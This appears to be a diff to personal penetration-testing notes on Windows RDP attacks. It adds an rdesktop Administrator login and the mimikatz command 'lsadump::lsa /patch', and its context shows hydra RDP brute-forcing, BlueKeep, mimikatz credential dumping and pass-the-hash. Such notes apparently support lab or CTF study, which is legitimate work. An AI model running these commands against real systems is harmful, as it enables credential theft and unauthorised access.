@@ -59,7 +59,7 @@
 	set RPORT 3333
 	run
 - `hydra -L path/to/user/wordlist -P path/to/password/wordlist rdp://10.2.24.86 -s 3333 ` -- to brute force login cred (you can use '-t' to change the speed default is 16 put it to 2 or 3 to not cause DOS on server)
-- `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[IP:PORT]`
+- `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[IP:PORT]` or `rdesktop -u Administrator -d CONTROLLER 10.10.33.104`
 
 ###### Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)
 - Msfconsole
@@ -154,6 +154,7 @@ that is a part of the local administrators group on the Windows target system
 	   `privilege::debug` -- if gives Privilege '20' ok then you have required privilege in order to perform hash extraction from memory
 	   `lsadump::sam`
 	   `sekurlsa::logonpasswords`
+	   `lsadump::lsa /patch`
 
 ###### Pass-The-Hash Attacks
 - `hashdump` -- copy LM and NT hash
